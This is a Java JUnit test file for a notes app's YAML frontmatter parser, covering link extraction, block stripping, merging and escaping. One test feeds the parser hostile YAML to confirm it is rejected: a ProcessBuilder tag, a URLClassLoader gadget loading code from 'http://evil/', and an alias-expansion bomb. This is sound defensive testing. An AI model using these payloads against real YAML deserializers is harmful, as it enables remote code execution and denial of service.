package com.moneylog.core.note.domain;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.util.List;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import com.moneylog.core.note.domain.Frontmatter.LinkRef;
import com.moneylog.core.note.exception.NoteExceptions.NoteFrontmatterInvalidException;

@DisplayName("Frontmatter (T107, S-166): leitura segura do YAML e edição sobre o texto")
class FrontmatterTest {

    private static final String FULL = """
            ---
            title: Revisão de outubro
            tags: [revisao-mensal, "Finanças"]
            aliases:
              - outubro
            moneylog:
              links:
                - { type: TRANSACTION, id: 9b1d7c2e-0000-4000-8000-000000000001 }
                - { type: MONTHLY_SUMMARY, key: 2026-10 }
                - { type: NOTE, path: reviews/x.md }
            ---
            # Corpo
            texto
            """;

    @Test
    @DisplayName("CA4: extrai título, tags e os vínculos tipados de moneylog.links")
    void deveLerTituloTagsEVinculos() {
        Frontmatter.Parsed parsed = Frontmatter.parse(FULL);
        assertThat(parsed.present()).isTrue();
        assertThat(parsed.title()).contains("Revisão de outubro");
        assertThat(parsed.rawTags()).containsExactly("revisao-mensal", "Finanças");
        assertThat(parsed.hasMoneylogKey()).isTrue();
        assertThat(parsed.moneylogLinks()).containsExactly(
                new LinkRef("TRANSACTION", "9b1d7c2e-0000-4000-8000-000000000001", null, null),
                new LinkRef("MONTHLY_SUMMARY", null, "2026-10", null),
                new LinkRef("NOTE", null, null, "reviews/x.md"));
        assertThat(FULL.substring(parsed.bodyStart())).startsWith("# Corpo");
    }

    @Test
    @DisplayName("sem frontmatter: dados vazios e o corpo começa em 0; --- sem fechamento não é frontmatter; primeira linha com lixo também não")
    void deveTratarAusencia() {
        assertThat(Frontmatter.parse("só corpo").present()).isFalse();
        assertThat(Frontmatter.parse("só corpo").bodyStart()).isZero();
        assertThat(Frontmatter.parse("---\ntitle: x\nsem fechar").present()).isFalse();
        assertThat(Frontmatter.parse("--- lixo\ntitle: x\n---\n").present()).isFalse();
        assertThat(Frontmatter.parse("---").present()).isFalse();
        assertThat(Frontmatter.parse("---\n---\ncorpo").present()).isTrue();
        assertThat(Frontmatter.parse("---\n...\ncorpo").present()).isTrue();
        assertThat(Frontmatter.parse("---\r\ntitle: a\r\n---\r\ncorpo").title()).contains("a");
    }

    @Test
    @DisplayName("tags como texto (vírgula/espaço), tag singular e itens não escalares ignorados")
    void deveLerTagsEmFormasDiversas() {
        assertThat(Frontmatter.parse("---\ntags: a, b c\n---\n").rawTags()).containsExactly("a", "b", "c");
        assertThat(Frontmatter.parse("---\ntag: solo\n---\n").rawTags()).containsExactly("solo");
        assertThat(Frontmatter.parse("---\ntags:\n  - a\n  - {x: y}\n  - 12\n---\n").rawTags()).containsExactly("a", "12");
        assertThat(Frontmatter.parse("---\ntags: 5\n---\n").rawTags()).isEmpty();
        assertThat(Frontmatter.parse("---\ntitle: 12\n---\n").title()).isEmpty();
        assertThat(Frontmatter.parse("---\ntitle: '  '\n---\n").title()).isEmpty();
    }

    @Test
    @DisplayName("CA4: YAML malicioso é recusado pelo leitor e o bloco vira corpo (nada é interpretado): tag !!java, aliases/âncoras, aninhamento, chave duplicada")
    void deveRecusarYamlMalicioso() {
        assertInvalid("---\nx: !!java.lang.ProcessBuilder [[\"calc\"]]\n---\n");
        assertInvalid("---\nx: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil/\"]]]]\n---\n");
        assertInvalid("---\na: &a [*a]\n---\n");
        assertInvalid("---\na: &x [1]\nb: *x\n---\n");
        assertInvalid("---\nlol1: &a [\"lol\"]\nlol2: &b [*a,*a,*a]\nlol3: [*b,*b,*b]\n---\n");
        assertInvalid("---\n" + "a: ".repeat(1) + "[".repeat(30) + "]".repeat(30) + "\n---\n");
        assertInvalid("---\na: 1\na: 2\n---\n");
        assertInvalid("---\n- lista\n- no topo\n---\n");
        assertInvalid("---\n: [broken\n---\n");
    }

    @Test
    @DisplayName("CA4: frontmatter acima de 64 KB não é frontmatter: o texto inteiro é corpo")
    void deveRecusarAcimaDe64Kb() {
        String big = "---\nx: " + "a".repeat(Frontmatter.MAX_BYTES) + "\n---\ncorpo";
        assertThat(Frontmatter.parse(big).present()).isFalse();
        assertThat(Frontmatter.parse(big).bodyStart()).isZero();
        assertThatThrownBy(() -> Frontmatter.locate(big)).isInstanceOf(NoteFrontmatterInvalidException.class);
        String ok = "---\nx: " + "a".repeat(Frontmatter.MAX_BYTES - 100) + "\n---\ncorpo";
        assertThat(Frontmatter.parse(ok).present()).isTrue();
        assertThat(Frontmatter.dropBlock(big)).isEqualTo("corpo");
    }

    @Test
    @DisplayName("moneylog.links com estrutura inválida é recusado")
    void deveValidarEstruturaDosVinculos() {
        assertThatThrownBy(() -> Frontmatter.parse("---\nmoneylog: 5\n---\n").moneylogLinks()).isInstanceOf(NoteFrontmatterInvalidException.class);
        assertThatThrownBy(() -> Frontmatter.parse("---\nmoneylog:\n  links: 5\n---\n").moneylogLinks()).isInstanceOf(NoteFrontmatterInvalidException.class);
        assertThatThrownBy(() -> Frontmatter.parse("---\nmoneylog:\n  links:\n    - 7\n---\n").moneylogLinks()).isInstanceOf(NoteFrontmatterInvalidException.class);
        assertThatThrownBy(() -> Frontmatter.parse("---\nmoneylog:\n  links:\n    - { id: x }\n---\n").moneylogLinks()).isInstanceOf(NoteFrontmatterInvalidException.class);
        assertThatThrownBy(() -> Frontmatter.parse("---\nmoneylog:\n  links:\n    - { type: GOAL, id: [a] }\n---\n").moneylogLinks())
                .isInstanceOf(NoteFrontmatterInvalidException.class);
        assertThat(Frontmatter.parse("---\nmoneylog:\n---\n").moneylogLinks()).isEmpty();
        assertThat(Frontmatter.parse("---\nmoneylog:\n  outro: 1\n---\n").moneylogLinks()).isEmpty();
        assertThat(Frontmatter.parse("---\ntitle: x\n---\n").moneylogLinks()).isEmpty();
    }

    @Test
    @DisplayName("stripMoneylog tira só o bloco moneylog e preserva as demais chaves (desconhecidas) do texto")
    void deveTirarSoOBlocoMoneylog() {
        String stripped = Frontmatter.stripMoneylog(FULL);
        assertThat(stripped).isEqualTo("---\ntitle: Revisão de outubro\ntags: [revisao-mensal, \"Finanças\"]\naliases:\n  - outubro\n---\n# Corpo\ntexto\n");
        assertThat(Frontmatter.parse(stripped).hasMoneylogKey()).isFalse();
    }

    @Test
    @DisplayName("stripMoneylog: bloco só com moneylog some inteiro; moneylog no meio; flow inline; sem moneylog devolve o mesmo")
    void deveTirarMoneylogEmVariasFormas() {
        assertThat(Frontmatter.stripMoneylog("---\nmoneylog:\n  links:\n    - { type: GOAL, id: x }\n---\ncorpo")).isEqualTo("corpo");
        assertThat(Frontmatter.stripMoneylog("---\na: 1\nmoneylog:\n  links: []\n# comentario\nb: 2\n---\ncorpo")).isEqualTo("---\na: 1\n# comentario\nb: 2\n---\ncorpo");
        assertThat(Frontmatter.stripMoneylog("---\n# so comentario\nmoneylog:\n  links: []\n---\ncorpo")).isEqualTo("---\n# so comentario\n---\ncorpo");
        assertThat(Frontmatter.stripMoneylog("---\nmoneylog: { links: [] }\ntags: x\n---\ncorpo")).isEqualTo("---\ntags: x\n---\ncorpo");
        String same = "---\ntitle: x\n---\ncorpo";
        assertThat(Frontmatter.stripMoneylog(same)).isSameAs(same);
        assertThat(Frontmatter.stripMoneylog("sem frontmatter")).isEqualTo("sem frontmatter");
        assertThat(Frontmatter.stripMoneylog("---\r\nmoneylog:\r\n  links: []\r\na: 1\r\n---\r\ncorpo")).isEqualTo("---\r\na: 1\r\n---\r\ncorpo");
    }

    @Test
    @DisplayName("withMoneylogLinks cria o frontmatter ou acrescenta ao existente, e o resultado lê de volta os mesmos vínculos")
    void deveAcrescentarVinculos() {
        List<LinkRef> refs = List.of(new LinkRef("TRANSACTION", "9b1d7c2e-0000-4000-8000-000000000001", null, null),
                new LinkRef("MONTHLY_SUMMARY", null, "2026-10", null), new LinkRef("NOTE", null, null, "pasta com espaço/n\"ota.md"),
                new LinkRef("GOAL", "id estranho: com \"aspas\" \\ e dois-pontos", null, null));
        String created = Frontmatter.withMoneylogLinks("corpo\n", refs);
        assertThat(created).startsWith("---\nmoneylog:\n  links:\n").endsWith("---\ncorpo\n");
        assertThat(Frontmatter.parse(created).moneylogLinks()).isEqualTo(refs);

        String merged = Frontmatter.withMoneylogLinks("---\ntitle: x\ntags: [a]\n---\ncorpo", refs);
        assertThat(merged).startsWith("---\ntitle: x\ntags: [a]\nmoneylog:\n").endsWith("---\ncorpo");
        assertThat(Frontmatter.parse(merged).moneylogLinks()).isEqualTo(refs);
        assertThat(Frontmatter.parse(merged).title()).contains("x");

        String empty = Frontmatter.withMoneylogLinks("---\n---\ncorpo", refs);
        assertThat(Frontmatter.parse(empty).moneylogLinks()).isEqualTo(refs);
        assertThat(Frontmatter.withMoneylogLinks("corpo", List.of())).isEqualTo("corpo");
        assertThat(Frontmatter.withMoneylogLinks("---\r\na: 1\r\n---\r\ncorpo", refs)).contains("\r\nmoneylog:\r\n  links:\r\n");
    }

    @Test
    @DisplayName("escalares: puro quando seguro, entre aspas com escapes (controle vira \\uXXXX)")
    void deveEscaparEscalares() {
        assertThat(Frontmatter.scalar("TRANSACTION")).isEqualTo("TRANSACTION");
        assertThat(Frontmatter.scalar("2026-10")).isEqualTo("2026-10");
        assertThat(Frontmatter.scalar("123")).isEqualTo("\"123\"");
        assertThat(Frontmatter.scalar("true")).isEqualTo("\"true\"");
        assertThat(Frontmatter.scalar("a b")).isEqualTo("\"a b\"");
        assertThat(Frontmatter.scalar("a\"b\\c")).isEqualTo("\"a\\\"b\\\\c\"");
        assertThat(Frontmatter.scalar("x\u0001y ")).isEqualTo("\"x\\u0001y\\u2028\"");
        assertThat(Frontmatter.scalar("")).isEqualTo("\"\"");
    }

    @Test
    @DisplayName("withMoneylogLinks num texto com frontmatter grande demais cria um bloco novo sem quebrar")
    void deveToleraFrontmatterInvalidoAoExportar() {
        String big = "---\nx: " + "a".repeat(Frontmatter.MAX_BYTES + 10) + "\n---\ncorpo";
        String out = Frontmatter.withMoneylogLinks(big, List.of(new LinkRef("GOAL", "a", null, null)));
        assertThat(out).startsWith("---\nmoneylog:").endsWith(big);
    }

    private static void assertInvalid(String text) {
        Frontmatter.Block block = Frontmatter.locate(text).orElseThrow();
        String yaml = text.substring(block.yamlStart(), block.yamlEnd());
        assertThatThrownBy(() -> Frontmatter.parseYaml(yaml)).as(text).isInstanceOf(NoteFrontmatterInvalidException.class);
        // e o texto continua inteiro como corpo, sem nada interpretado
        assertThat(Frontmatter.parse(text).present()).as(text).isFalse();
        assertThat(Frontmatter.parse(text).data()).isEmpty();
    }

    @Test
    @DisplayName("S-273: só é frontmatter o bloco fechado com mapa YAML válido (ou vazio); régua horizontal, lista e escalar são corpo")
    void soEFrontmatterUmMapaValido() {
        for (String text : new String[] {"---\nAta da reunião\n---\nConteúdo", "---\n- a\n- b\n---\nx", "---\ntexto: com: dois: pontos\n---\nx",
                "---\n| a | b |\n|---|---|\n---\nx", "---\nsem fechamento\n", "---\n[[link]]\n---\n"}) {
            Frontmatter.Parsed parsed = Frontmatter.parse(text);
            assertThat(parsed.present()).as(text).isFalse();
            assertThat(parsed.bodyStart()).as(text).isZero();
        }
        assertThat(Frontmatter.parse("---\n---\ncorpo").present()).isTrue();
        assertThat(Frontmatter.parse("---\n\n---\ncorpo").present()).isTrue();
        assertThat(Frontmatter.parse("---\n# só comentário\n---\ncorpo").present()).isTrue();
        assertThat(Frontmatter.parse("---\ntitle: x\n---\ncorpo").present()).isTrue();
    }

    @Test
    @DisplayName("S-273: texto que começa com --- sem ser frontmatter faz a viagem de ida e volta byte a byte com vínculos")
    void reguaHorizontalFazRoundTrip() {
        List<LinkRef> refs = List.of(new LinkRef("MONTHLY_SUMMARY", null, "2026-10", null));
        for (String text : new String[] {"---\nAta da reunião\n---\nConteúdo", "---\n- a\n---\n", "---\n---\ncorpo", "---\n---\n", "---\n\n---\ncorpo",
                "---\r\n\r\n---\r\ncorpo\r\n", "---\n   \n---\n"}) {
            String exported = Frontmatter.withMoneylogLinks(text, refs);
            assertThat(Frontmatter.parse(exported).moneylogLinks()).as(text).isEqualTo(refs);
            assertThat(Frontmatter.stripMoneylog(exported)).as(text).isEqualTo(text);
        }
    }

    @Test
    @DisplayName("M6: a chave moneylog entre aspas ou com espaço antes dos dois-pontos também é tirada do texto")
    void tiraAChaveMoneylogEscritaDeOutraForma() {
        for (String key : new String[] {"\"moneylog\":", "'moneylog':", "moneylog :", "moneylog:"}) {
            String text = "---\ntitle: x\n" + key + "\n  links:\n    - { type: GOAL, id: a }\n---\ncorpo";
            Frontmatter.Parsed parsed = Frontmatter.parse(text);
            assertThat(parsed.hasMoneylogKey()).as(key).isTrue();
            assertThat(parsed.moneylogLinks()).as(key).hasSize(1);
            String stripped = Frontmatter.stripMoneylog(text);
            assertThat(stripped).as(key).isEqualTo("---\ntitle: x\n---\ncorpo");
            assertThat(Frontmatter.parse(stripped).hasMoneylogKey()).as(key).isFalse();
        }
        assertThat(Frontmatter.stripMoneylog("---\nmoneylog2: 1\n---\n")).isEqualTo("---\nmoneylog2: 1\n---\n");
    }

    @Test
    @DisplayName("S-275: o estado do vínculo (nota na lixeira) vai e volta na exportação")
    void vaiEVoltaOEstado() {
        List<LinkRef> refs = List.of(new LinkRef("NOTE", null, null, "lixo.md", "trashed"));
        String exported = Frontmatter.withMoneylogLinks("corpo", refs);
        assertThat(exported).contains("state: trashed");
        assertThat(Frontmatter.parse(exported).moneylogLinks()).isEqualTo(refs);
    }
}
